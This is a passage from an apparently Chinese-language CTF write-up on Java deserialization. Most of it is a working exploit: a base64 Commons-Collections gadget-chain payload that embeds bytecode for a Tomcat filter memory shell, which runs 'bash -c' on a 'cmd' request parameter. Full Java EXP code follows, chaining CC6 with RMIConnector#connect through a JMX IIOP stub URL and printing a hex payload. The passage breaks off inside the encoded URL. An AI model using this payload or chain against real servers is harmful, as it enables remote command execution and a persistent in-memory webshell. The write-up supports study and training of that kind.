+<pre><code class="language-java">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAACc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABVMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAZ7Mr+ur4AAAA0ATwKAEsAowcApAgApQsAAgCmBwCnBwCoCACpCACqCACrCgAFAKwKAAUArQcArgcArwoAsACxCgANALIKAAwAswcAtAoAEQCjCgAMALUHALYKABQAowoAFAC3CAC4CgC5ALoKABQAuwoAEQC8CwC9AL4KAAYAvwoAwADBCgCwAMILAMMAxAgAxQoAuQDGCgAUAMcIAMgKAMkAygoAyQDLBwDMCgAmAM0LAM4AzwcA0AoASADRCgBEANIIAJEKAEQA0wcA1AoA1QDWCgDVANcHANgHANkKADIAowcA2goANACjCgA0ANsKADQA3AoARADdCgA0AN4KACkA3wcA4AoAOwCjCgA7AOEKADsA3AkA4gDjCgDiAOQKADsA5QoAKQDmBwDnBwDoBwDpCgBEAOoKAOsA1gcA7AoA6wDtCwAxAO4HAO8HAPABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKExTaGlyb0NCL1RvbWNhdEZpbHRlck1lbVNoZWxsRnJvbVRocmVhZDsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwDxAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQANU3RhY2tNYXBUYWJsZQcA2QcA8gcA8wcA9AcApAcA9QcArgcAqAcAtAcA9gEAB2Rlc3Ryb3kBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwD3AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAARuYW1lAQAKVVJMUGF0dGVybgEAFXdlYmFwcENsYXNzTG9hZGVyQmFzZQEAMkxvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2U7AQAPc3RhbmRhcmRDb250ZXh0AQAqTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7AQAGYUNsYXNzAQARTGphdmEvbGFuZy9DbGFzczsBAAdDb25maWdzAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADWZpbHRlckNvbmZpZ3MBAA9MamF2YS91dGlsL01hcDsBAA5iZWhpbmRlckZpbHRlcgEACWZpbHRlckRlZgEAMUxvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlckRlZjsBAAlmaWx0ZXJNYXABADFMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXA7AQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAyTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkZpbHRlckNvbmZpZzsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQA+TGphdmEvbGFuZy9DbGFzczwrTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7PjsHAMwHANAHAOgHANQBAApTb3VyY2VGaWxlAQAjVG9tY2F0RmlsdGVyTWVtU2hlbGxGcm9tVGhyZWFkLmphdmEMAE0ATgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAFjDAD4APkBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAEYmFzaAEAAi1jAQADY21kDABNAPoMAPsA/AEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwD1DAD9AP4MAE0A/wwATQEAAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwBAQECAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQMBBAEADmxpbmUuc2VwYXJhdG9yBwEFDAEGAPkMAQcBAgwBAwEIBwDzDAEJAQoMAE0BCwcBDAwBDQEODAB3AE4HAPQMAFoBDwEAD015RmlsdGVyVmVyc2lvbgwBEAERDAEDARIBAAIvKgcBEwwBFAEVDAEWARcBADBvcmcvYXBhY2hlL2NhdGFsaW5hL2xvYWRlci9XZWJhcHBDbGFzc0xvYWRlckJhc2UMARgBGQcBGgwBGwEcAQAob3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dAwBHQEeDAEfAR4MASABIQEAE2phdmEvbGFuZy9FeGNlcHRpb24HASIMASMBJAwBJQEmAQANamF2YS91dGlsL01hcAEAJlNoaXJvQ0IvVG9tY2F0RmlsdGVyTWVtU2hlbGxGcm9tVGhyZWFkAQAvb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWYMAScBKAwBKQEODAEqAQIMASsBDgwBLAEtAQAvb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXAMAS4BDgcBLwwBMAExDACHAQIMATIBDgwBMwE0AQAwb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uRmlsdGVyQ29uZmlnAQAPamF2YS9sYW5nL0NsYXNzAQAbb3JnL2FwYWNoZS9jYXRhbGluYS9Db250ZXh0DAE1ATYHATcBABBqYXZhL2xhbmcvT2JqZWN0DAE4ATkMAToBOwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEACHRvU3RyaW5nAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAGyhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjspVgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAQChMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYBAAhuYW5vVGltZQEAAygpSgEAHChKKUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADGdldFJlc291cmNlcwEAJygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290OwEAI29yZy9hcGFjaGUvY2F0YWxpbmEvV2ViUmVzb3VyY2VSb290AQAKZ2V0Q29udGV4dAEAHygpTG9yZy9hcGFjaGUvY2F0YWxpbmEvQ29udGV4dDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA1nZXRTdXBlcmNsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACXNldEZpbHRlcgEAGShMamF2YXgvc2VydmxldC9GaWx0ZXI7KVYBAA1zZXRGaWx0ZXJOYW1lAQAHZ2V0TmFtZQEADnNldEZpbHRlckNsYXNzAQAMYWRkRmlsdGVyRGVmAQA0KExvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlckRlZjspVgEADWFkZFVSTFBhdHRlcm4BABxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlAQAHUkVRVUVTVAEAHkxqYXZheC9zZXJ2bGV0L0Rpc3BhdGNoZXJUeXBlOwEADXNldERpc3BhdGNoZXIBABJhZGRGaWx0ZXJNYXBCZWZvcmUBADQoTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyTWFwOylWAQAWZ2V0RGVjbGFyZWRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yAQALbmV3SW5zdGFuY2UBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcv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
+</code></pre>
+<p>所以getObject()类如下</p>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/img/image-20220430152555703.png" alt="image-20220430152555703" loading="lazy"></figure>
+<p>然后就是构造EXP，这里直接用CC6去装这个，把<code>RMIConnector#connect()</code>代替<code>Runtime#exec()</code>传入InvokerTransformer，后面就跟CC6一样就行</p>
+<pre><code class="language-java">RMIConnector rmiConnector = (RMIConnector) getObject();
+//        rmiConnector.connect();
+
+        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);
+
+        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();
+        map2.put(tiedMapEntry, &quot;bbb&quot;);
+        lazyMap.remove(rmiConnector);
+
+        Class c = LazyMap.class;
+        Field factoryField = c.getDeclaredField(&quot;factory&quot;);
+        factoryField.setAccessible(true);
+        factoryField.set(lazyMap,invokerTransformer);
+</code></pre>
+<p>然后将其序列化并且字节流导出为字节数组并转为16进制数据</p>
+<pre><code class="language-java">ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//新建一个字节流
+ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);//把字节流转为对象流
+objectOutputStream.writeUTF(&quot;SJTU&quot;);//往UTF中写入SJTU
+objectOutputStream.writeInt(1896);//往Int中写入1896
+objectOutputStream.writeObject(map2);//序列化
+
+byte[] payload = byteArrayOutputStream.toByteArray();//把字节流导出为字节数组
+String finalPayload = Utils.bytesTohexString(payload);//把字节数组转为16进制
+System.out.println(finalPayload);
+</code></pre>
+<h5 id="exp">EXP</h5>
+<pre><code class="language-java">package com.le1a.ctf.tctf;
+
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import javax.management.remote.JMXServiceURL;
+import javax.management.remote.rmi.RMIConnection;
+import javax.management.remote.rmi.RMIConnector;
+import javax.xml.bind.DatatypeConverter;
+import java.io.ByteArrayOutputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+
+public class Exp {
+    public static void main(String[] args) throws Exception{
+
+        RMIConnector rmiConnector = (RMIConnector) getObject();
+//        rmiConnector.connect();
+
+        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;connect&quot;, null, null);
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1));
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);
+
+        HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;();
+        map2.put(tiedMapEntry, &quot;bbb&quot;);
+        lazyMap.remove(rmiConnector);
+
+        Class c = LazyMap.class;
+        Field factoryField = c.getDeclaredField(&quot;factory&quot;);
+        factoryField.setAccessible(true);
+        factoryField.set(lazyMap,invokerTransformer);
+
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//新建一个字节流
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);//把字节流转为对象流
+        objectOutputStream.writeUTF(&quot;SJTU&quot;);//往UTF中写入SJTU
+        objectOutputStream.writeInt(1896);//往Int中写入1896
+        objectOutputStream.writeObject(map2);//序列化
+
+
+        byte[] payload = byteArrayOutputStream.toByteArray();//把字节流导出为字节数组
+
+        String finalPayload = Utils.bytesTohexString(payload);//把字节数组转为16进制
+        System.out.println(finalPayload);
+    }
+
+    private static Object getObject() throws Exception{
+        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:iiop:///stub/rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADYWFhc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAACc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAPm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5JbnN0YW50aWF0ZVRyYW5zZm9ybWVyNIv0f6SG0DsCAAJbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXNyADpjb20uc3VuLm9yZy5hcGFjaGUueGFsYW4uaW50ZXJuYWwueHNsdGMudHJheC5UZW1wbGF0ZXNJbXBsCVdPwW6sqzMDAAZJAA1faW5kZW50TnVtYmVySQAOX3RyYW5zbGV0SW5kZXhbAApfYnl0ZWNvZGVzdAADW1tCWwAGX2NsYXNzcQB+ABVMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAAZ7Mr+ur4AAAA0ATwKAEsAowcApAgApQsAAgCmBwCnBwCoCACpCACqCACrCgAFAKwKAAUArQcArgcArwoAsACxCgANALIKAAwAswcAtAoAEQCjCgAMALUHALYKABQAowoAFAC3CAC4CgC5ALoKABQAuwoAEQC8CwC9AL4KAAYAvwoAwADBCgCwAMILAMMAxAgAxQoAuQDGCgAUAMcIAMgKAMkAygoAyQDLBwDMCgAmAM0LAM4AzwcA0AoASADRCgBEANIIAJEKAEQA0wcA1AoA1QDWCgDVANcHANgHANkKADIAowcA2goANACjCgA0ANsKADQA3AoARADdCgA0AN4KACkA3wcA4AoAOwCjCgA7AOEKADsA3AkA4gDjCgDiAOQKADsA5QoAKQDmBwDnBwDoBwDpCgBEAOoKAOsA1gcA7AoA6wDtCwAxAO4HAO8HAPABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKExTaGlyb0NCL1RvbWNhdEZpbHRlck1lbVNoZWxsRnJvbVRocmVhZDsBAARpbml0AQAfKExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzspVgEADGZpbHRlckNvbmZpZwEAHExqYXZheC9zZXJ2bGV0L0ZpbHRlckNvbmZpZzsBAApFeGNlcHRpb25zBwDxAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBABJMamF2YS9sYW5nL1N0cmluZzsBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADcmVxAQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQANU3RhY2tNYXBUYWJsZQcA2QcA8gcA8wcA9AcApAcA9QcArgcAqAcAtAcA9gEAB2Rlc3Ryb3kBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3Nlcml